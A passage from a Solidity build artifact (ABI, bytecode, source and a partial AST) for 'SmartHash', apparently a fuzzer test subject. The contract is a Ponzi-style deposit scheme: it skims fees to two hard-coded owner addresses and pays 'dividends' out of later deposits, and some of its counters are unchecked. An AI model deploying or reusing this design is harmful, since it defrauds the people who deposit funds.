{
  "contractName": "SmartHash",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "admAddress",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "advAddress",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "totalWithdrewWei",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "totalDepositedWei",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_address",
          "type": "address"
        }
      ],
      "name": "userDepositedWei",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_address",
          "type": "address"
        }
      ],
      "name": "userWithdrewWei",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_address",
          "type": "address"
        }
      ],
      "name": "userDividendsWei",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_address",
          "type": "address"
        }
      ],
      "name": "userReferralsWei",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "metadata": "{\"compiler\":{\"version\":\"0.4.26+commit.4563c3fc\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":true,\"inputs\":[],\"name\":\"admAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"userDividendsWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"advAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalWithdrewWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"userDepositedWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalDepositedWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"userReferralsWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"userWithdrewWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"project:/contracts/Test1.sol\":\"SmartHash\"},\"evmVersion\":\"byzantium\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"project:/contracts/Test1.sol\":{\"keccak256\":\"0x5d6d01bdd7dd2d9830002080d33e84be4cd1bd1c0934fadd47691d684151514d\",\"urls\":[\"bzzr://be254288b3fcaa7749bbc375f243d2d27603943a691b056e52155ab048ea2e12\"]}},\"version\":1}",
  "bytecode": "0x60806040526000600455600060055534801561001a57600080fd5b506109b48061002a6000396000f30060806040526004361061008e576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063031dcaf5146104e95780631b68adff146105405780635b9de1d314610597578063b781e47d146105ee578063c8d1c6cf14610619578063ee12d4f214610670578063ee1596e51461069b578063fc4fcc5a146106f2575b60008060008060006100ab6100a4346005610749565b6064610781565b94506100c26100bb34600a610749565b6064610781565b935073d0396aaecb5547776852ab8682ba72e1209b536d73ffffffffffffffffffffffffffffffffffffffff166108fc859081150290604051600060405180830381858888f1935050505015801561011e573d6000803e3d6000fd5b5073b5a885c796dbd4656345551cc41d3e8844ac8c0473ffffffffffffffffffffffffffffffffffffffff166108fc869081150290604051600060405180830381858888f19350505050158015610179573d6000803e3d6000fd5b5060008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541415156103165733925061026d61026561021e6102176000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546004610749565b6064610781565b600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020544303610749565b61170c610781565b91508273ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f193505050501580156102b5573d6000803e3d6000fd5b5081600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555061030f60055483610797565b6005819055505b6103526000368080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050506107b3565b905060008173ffffffffffffffffffffffffffffffffffffffff161180156103a657503373ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614155b15610440578073ffffffffffffffffffffffffffffffffffffffff166108fc869081150290604051600060405180830381858888f193505050501580156103f1573d6000803e3d6000fd5b5084600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505b43600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055506104dc60045434610797565b6004819055505050505050005b3480156104f557600080fd5b506104fe6107c1565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561054c57600080fd5b50610581600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506107d9565b6040518082815260200191505060405180910390f35b3480156105a357600080fd5b506105ac61088a565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156105fa57600080fd5b506106036108a2565b6040518082815260200191505060405180910390f35b34801561062557600080fd5b5061065a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506108a8565b6040518082815260200191505060405180910390f35b34801561067c57600080fd5b506106856108f0565b6040518082815260200191505060405180910390f35b3480156106a757600080fd5b506106dc600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506108f6565b6040518082815260200191505060405180910390f35b3480156106fe57600080fd5b50610733600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061093f565b6040518082815260200191505060405180910390f35b60008083141561075c576000905061077b565b818302905081838281151561076d57fe5b0414151561077757fe5b8090505b92915050565b6000818381151561078e57fe5b04905092915050565b600081830190508281101515156107aa57fe5b80905092915050565b600060148201519050919050565b73b5a885c796dbd4656345551cc41d3e8844ac8c0481565b600061088361087b61083461082d6000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546004610749565b6064610781565b600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020544303610749565b61170c610781565b9050919050565b73d0396aaecb5547776852ab8682ba72e1209b536d81565b60055481565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60045481565b6000600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6000600160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490509190505600a165627a7a72305820d9bf335341f70de099e628eded138f426beca85216b3188af5a62a370bfa367b0029",
  "deployedBytecode": "0x60806040526004361061008e576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063031dcaf5146104e95780631b68adff146105405780635b9de1d314610597578063b781e47d146105ee578063c8d1c6cf14610619578063ee12d4f214610670578063ee1596e51461069b578063fc4fcc5a146106f2575b60008060008060006100ab6100a4346005610749565b6064610781565b94506100c26100bb34600a610749565b6064610781565b935073d0396aaecb5547776852ab8682ba72e1209b536d73ffffffffffffffffffffffffffffffffffffffff166108fc859081150290604051600060405180830381858888f1935050505015801561011e573d6000803e3d6000fd5b5073b5a885c796dbd4656345551cc41d3e8844ac8c0473ffffffffffffffffffffffffffffffffffffffff166108fc869081150290604051600060405180830381858888f19350505050158015610179573d6000803e3d6000fd5b5060008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541415156103165733925061026d61026561021e6102176000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546004610749565b6064610781565b600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020544303610749565b61170c610781565b91508273ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f193505050501580156102b5573d6000803e3d6000fd5b5081600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555061030f60055483610797565b6005819055505b6103526000368080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050506107b3565b905060008173ffffffffffffffffffffffffffffffffffffffff161180156103a657503373ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614155b15610440578073ffffffffffffffffffffffffffffffffffffffff166108fc869081150290604051600060405180830381858888f193505050501580156103f1573d6000803e3d6000fd5b5084600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505b43600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055506104dc60045434610797565b6004819055505050505050005b3480156104f557600080fd5b506104fe6107c1565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561054c57600080fd5b50610581600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506107d9565b6040518082815260200191505060405180910390f35b3480156105a357600080fd5b506105ac61088a565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156105fa57600080fd5b506106036108a2565b6040518082815260200191505060405180910390f35b34801561062557600080fd5b5061065a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506108a8565b6040518082815260200191505060405180910390f35b34801561067c57600080fd5b506106856108f0565b6040518082815260200191505060405180910390f35b3480156106a757600080fd5b506106dc600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506108f6565b6040518082815260200191505060405180910390f35b3480156106fe57600080fd5b50610733600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061093f565b6040518082815260200191505060405180910390f35b60008083141561075c576000905061077b565b818302905081838281151561076d57fe5b0414151561077757fe5b8090505b92915050565b6000818381151561078e57fe5b04905092915050565b600081830190508281101515156107aa57fe5b80905092915050565b600060148201519050919050565b73b5a885c796dbd4656345551cc41d3e8844ac8c0481565b600061088361087b61083461082d6000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546004610749565b6064610781565b600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020544303610749565b61170c610781565b9050919050565b73d0396aaecb5547776852ab8682ba72e1209b536d81565b60055481565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60045481565b6000600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6000600160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490509190505600a165627a7a72305820d9bf335341f70de099e628eded138f426beca85216b3188af5a62a370bfa367b0029",
  "sourceMap": "25:2454:0:-;;;411:1;376:36;;449:1;415:35;;25:2454;8:9:-1;5:2;;;30:1;27;20:12;5:2;25:2454:0;;;;;;;",
  "deployedSourceMap": "25:2454:0:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1014:18;1064:15;1218:16;1252:24;1523:16;1035:25;1039:16;1043:9;1053:1;1039:3;:16::i;:::-;1056:3;1035;:25::i;:::-;1014:46;;1082:26;1086:17;1090:9;1100:2;1086:3;:17::i;:::-;1104:3;1082;:26::i;:::-;1064:44;;166:42;1113:19;;:28;1133:7;1113:28;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;1113:28:0;84:42;1145:19;;:31;1165:10;1145:31;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;1145:31:0;1210:1;1185:9;:21;1195:10;1185:21;;;;;;;;;;;;;;;;:26;;1181:338;;;1237:10;1218:29;;1279:87;1283:77;1287:37;1291:28;1295:9;:21;1305:10;1295:21;;;;;;;;;;;;;;;;1317:1;1291:3;:28::i;:::-;1320:3;1287;:37::i;:::-;1338:9;:21;1348:10;1338:21;;;;;;;;;;;;;;;;1325:12;:34;1283:3;:77::i;:::-;1361:4;1279:3;:87::i;:::-;1252:114;;1371:8;:17;;:35;1389:16;1371:35;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;1371:35:0;1436:16;1412:8;:20;1421:10;1412:20;;;;;;;;;;;;;;;;:40;;;;;;;;;;;1476:38;1480:16;;1497;1476:3;:38::i;:::-;1457:16;:57;;;;1181:338;1542:24;1557:8;;1542:24;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:14;:24::i;:::-;1523:43;;1585:3;1574:8;:14;;;:40;;;;;1604:10;1592:22;;:8;:22;;;;1574:40;1570:124;;;1621:8;:17;;:29;1639:10;1621:29;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;1621:29:0;1679:10;1656:9;:19;1666:8;1656:19;;;;;;;;;;;;;;;;:33;;;;;;;;;;;1570:124;1722:12;1698:9;:21;1708:10;1698:21;;;;;;;;;;;;;;;:36;;;;1763:9;1738;:21;1748:10;1738:21;;;;;;;;;;;;;;;;:34;;;;;;;;;;;1797:32;1801:17;;1819:9;1797:3;:32::i;:::-;1777:17;:52;;;;982:851;;;;;25:2454;47:79;;8:9:-1;5:2;;;30:1;27;20:12;5:2;47:79:0;;;;;;;;;;;;;;;;;;;;;;;;;;;2062:175;;8:9:-1;5:2;;;30:1;27;20:12;5:2;2062:175:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;129:79;;8:9:-1;5:2;;;30:1;27;20:12;5:2;129:79:0;;;;;;;;;;;;;;;;;;;;;;;;;;;415:35;;8:9:-1;5:2;;;30:1;27;20:12;5:2;415:35:0;;;;;;;;;;;;;;;;;;;;;;;1836:111;;8:9:-1;5:2;;;30:1;27;20:12;5:2;1836:111:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;376:36;;8:9:-1;5:2;;;30:1;27;20:12;5:2;376:36:0;;;;;;;;;;;;;;;;;;;;;;;2240:111;;8:9:-1;5:2;;;30:1;27;20:12;5:2;2240:111:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1950:109;;8:9:-1;5:2;;;30:1;27;20:12;5:2;1950:109:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;456:174;516:9;543:1;537:2;:7;533:36;;;561:1;554:8;;;;533:36;583:2;578;:7;574:11;;608:2;602;598:1;:6;;;;;;;;:12;591:20;;;;;;624:1;617:8;;456:174;;;;;:::o;634:94::-;694:7;721:2;716;:7;;;;;;;;709:14;;634:94;;;;:::o;852:128::-;912:9;938:2;933;:7;929:11;;958:2;953:1;:7;;946:15;;;;;;974:1;967:8;;852:128;;;;:::o;2354:123::-;2411:12;2466:2;2461:3;2457:12;2451:19;2443:27;;2438:36;;;:::o;47:79::-;84:42;47:79;:::o;2062:175::-;2127:7;2147:83;2151:73;2155:35;2159:26;2163:9;:19;2173:8;2163:19;;;;;;;;;;;;;;;;2183:1;2159:3;:26::i;:::-;2186:3;2155;:35::i;:::-;2204:9;:19;2214:8;2204:19;;;;;;;;;;;;;;;;2191:12;:32;2151:3;:73::i;:::-;2225:4;2147:3;:83::i;:::-;2140:90;;2062:175;;;:::o;129:79::-;166:42;129:79;:::o;415:35::-;;;;:::o;1836:111::-;1901:7;1921:9;:19;1931:8;1921:19;;;;;;;;;;;;;;;;1914:26;;1836:111;;;:::o;376:36::-;;;;:::o;2240:111::-;2305:7;2325:9;:19;2335:8;2325:19;;;;;;;;;;;;;;;;2318:26;;2240:111;;;:::o;1950:109::-;2014:7;2034:8;:18;2043:8;2034:18;;;;;;;;;;;;;;;;2027:25;;1950:109;;;:::o",
  "source": "pragma solidity ^0.4.25;\ncontract SmartHash {\n\taddress public constant admAddress = 0xb5a885c796DbD4656345551cc41d3E8844ac8c04;\n\taddress public constant advAddress = 0xd0396aAEcb5547776852aB8682Ba72E1209b536d;\n\n\tmapping (address => uint256) deposited;\n\tmapping (address => uint256) withdrew;\n\tmapping (address => uint256) refearned;\n\tmapping (address => uint256) blocklock;\n\n\tuint256 public totalDepositedWei = 0;\n\tuint256 public totalWithdrewWei = 0;\n    function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n    if (_a == 0) {\n      return 0;\n    }\n    c = _a * _b;\n    assert(c / _a == _b);\n    return c;\n  }\n\n  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n    return _a / _b;\n  }\n\n  function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n    assert(_b <= _a);\n    return _a - _b;\n  }\n\n  function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n    c = _a + _b;\n    assert(c >= _a);\n    return c;\n  }\n\tfunction() payable external {\n\t\tuint256 admRefPerc = div(mul(msg.value,5),100);\n\t\tuint256 advPerc = div(mul(msg.value,10),100);\n\n\t\tadvAddress.transfer(advPerc);\n\t\tadmAddress.transfer(admRefPerc);\n\n\t\tif (deposited[msg.sender] != 0) {\n\t\t\taddress investor = msg.sender;\n\t\t\tuint256 depositsPercents = div(mul(div(mul(deposited[msg.sender],4),100),block.number-blocklock[msg.sender]),5900);\n\t\t\tinvestor.transfer(depositsPercents);\n\n\t\t\twithdrew[msg.sender] += depositsPercents;\n\t\t\ttotalWithdrewWei = add(totalWithdrewWei,depositsPercents);\n\t\t}\n\n\t\taddress referrer = bytesToAddress(msg.data);\n\t\tif (referrer > 0x0 && referrer != msg.sender) {\n\t\t\treferrer.transfer(admRefPerc);\n\n\t\t\trefearned[referrer] += admRefPerc;\n\t\t}\n\n\t\tblocklock[msg.sender] = block.number;\n\t\tdeposited[msg.sender] += msg.value;\n\n\t\ttotalDepositedWei = add(totalDepositedWei,msg.value);\n\t}\n\n\tfunction userDepositedWei(address _address) public view returns (uint256) {\n\t\treturn deposited[_address];\n    }\n\n\tfunction userWithdrewWei(address _address) public view returns (uint256) {\n\t\treturn withdrew[_address];\n    }\n\n\tfunction userDividendsWei(address _address) public view returns (uint256) {\n\t\treturn div(mul(div(mul(deposited[_address],4),100),block.number-blocklock[_address]),5900);\n    }\n\n\tfunction userReferralsWei(address _address) public view returns (uint256) {\n\t\treturn refearned[_address];\n    }\n\n\tfunction bytesToAddress(bytes bys) private pure returns (address addr) {\n\t\tassembly {\n\t\t\taddr := mload(add(bys, 20))\n\t\t}\n\t}\n}",
  "sourcePath": "/home/yym/CGen/Fuzzer/simple-storage/contracts/Test1.sol",
  "ast": {
    "absolutePath": "project:/contracts/Test1.sol",
    "exportedSymbols": {
      "SmartHash": [
        344
      ]
    },
    "id": 345,
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1,
        "literals": [
          "solidity",
          "^",
          "0.4",
          ".25"
        ],
        "nodeType": "PragmaDirective",
        "src": "0:24:0"
      },
      {
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "contract",
        "documentation": null,
        "fullyImplemented": true,
        "id": 344,
        "linearizedBaseContracts": [
          344
        ],
        "name": "SmartHash",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": true,
            "id": 4,
            "name": "admAddress",
            "nodeType": "VariableDeclaration",
            "scope": 344,
            "src": "47:79:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 2,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "47:7:0",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "value": {
              "argumentTypes": null,
              "hexValue": "307862356138383563373936446244343635363334353535316363343164334538383434616338633034",
              "id": 3,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "number",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "84:42:0",
              "subdenomination": null,
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              },
              "value": "0xb5a885c796DbD4656345551cc41d3E8844ac8c04"
            },
            "visibility": "public"
          },
          {
            "constant": true,
            "id": 7,
            "name": "advAddress",
            "nodeType": "VariableDeclaration",
            "scope": 344,
            "src": "129:79:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 5,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "129:7:0",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "value": {
              "argumentTypes": null,
              "hexValue": "307864303339366141456362353534373737363835326142383638324261373245313230396235333664",
              "id": 6,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "number",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "166:42:0",
              "subdenomination": null,
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              },
              "value": "0xd0396aAEcb5547776852aB8682Ba72E1209b536d"
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "id": 11,
            "name": "deposited",
            "nodeType": "VariableDeclaration",
            "scope": 344,
            "src": "212:38:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
              "typeString": "mapping(address => uint256)"
            },
            "typeName": {
              "id": 10,
              "keyType": {
                "id": 8,
                "name": "address",
                "nodeType": "ElementaryTypeName",
                "src": "221:7:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_address",
                  "typeString": "address"
                }
              },
              "nodeType": "Mapping",
              "src": "212:28:0",
              "typeDescriptions": {
                "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                "typeString": "mapping(address => uint256)"
              },
              "valueType": {
                "id": 9,
                "name": "uint256",
                "nodeType": "ElementaryTypeName",
                "src": "232:7:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_uint256",
                  "typeString": "uint256"
                }
              }
            },
            "value": null,
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 15,
            "name": "withdrew",
            "nodeType": "VariableDeclaration",
            "scope": 344,
            "src": "253:37:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
              "typeString": "mapping(address => uint256)"
            },
            "typeName": {
              "id": 14,
              "keyType": {
                "id": 12,
                "name": "address",
                "nodeType": "ElementaryTypeName",
                "src": "262:7:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_address",
                  "typeString": "address"
                }
              },
              "nodeType": "Mapping",
              "src": "253:28:0",
              "typeDescriptions": {
                "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                "typeString": "mapping(address => uint256)"
              },
              "valueType": {
                "id": 13,
                "name": "uint256",
                "nodeType": "ElementaryTypeName",
                "src": "273:7:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_uint256",
                  "typeString": "uint256"
                }
              }
            },
            "value": null,
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 19,
            "name": "refearned",
            "nodeType": "VariableDeclaration",
            "scope": 344,
            "src": "293:38:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
              "typeString": "mapping(address => uint256)"
            },
            "typeName": {
              "id": 18,
              "keyType": {
                "id": 16,
                "name": "address",
                "nodeType": "ElementaryTypeName",
                "src": "302:7:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_address",
                  "typeString": "address"
                }
              },
              "nodeType": "Mapping",
              "src": "293:28:0",
              "typeDescriptions": {
                "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                "typeString": "mapping(address => uint256)"
              },
              "valueType": {
                "id": 17,
                "name": "uint256",
                "nodeType": "ElementaryTypeName",
                "src": "313:7:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_uint256",
                  "typeString": "uint256"
                }
              }
            },
            "value": null,
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 23,
            "name": "blocklock",
            "nodeType": "VariableDeclaration",
            "scope": 344,
            "src": "334:38:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
              "typeString": "mapping(address => uint256)"
            },
            "typeName": {
              "id": 22,
              "keyType": {
                "id": 20,
                "name": "address",
                "nodeType": "ElementaryTypeName",
                "src": "343:7:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_address",
                  "typeString": "address"
                }
              },
              "nodeType": "Mapping",
              "src": "334:28:0",
              "typeDescriptions": {
                "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                "typeString": "mapping(address => uint256)"
              },
              "valueType": {
                "id": 21,
                "name": "uint256",
                "nodeType": "ElementaryTypeName",
                "src": "354:7:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_uint256",
                  "typeString": "uint256"
                }
              }
            },
            "value": null,
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 26,
            "name": "totalDepositedWei",
            "nodeType": "VariableDeclaration",
            "scope": 344,
            "src": "376:36:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 24,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "376:7:0",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "value": {
              "argumentTypes": null,
              "hexValue": "30",
              "id": 25,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "number",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "411:1:0",
              "subdenomination": null,
              "typeDescriptions": {
                "typeIdentifier": "t_rational_0_by_1",
                "typeString": "int_const 0"
              },
              "value": "0"
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "id": 29,
            "name": "totalWithdrewWei",
            "nodeType": "VariableDeclaration",
            "scope": 344,
            "src": "415:35:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 27,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "415:7:0",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "value": {
              "argumentTypes": null,
              "hexValue": "30",
              "id": 28,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "number",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "449:1:0",
              "subdenomination": null,
              "typeDescriptions": {
                "typeIdentifier": "t_rational_0_by_1",
                "typeString": "int_const 0"
              },
              "value": "0"
            },
            "visibility": "public"
          },
          {
            "body": {
              "id": 61,
              "nodeType": "Block",
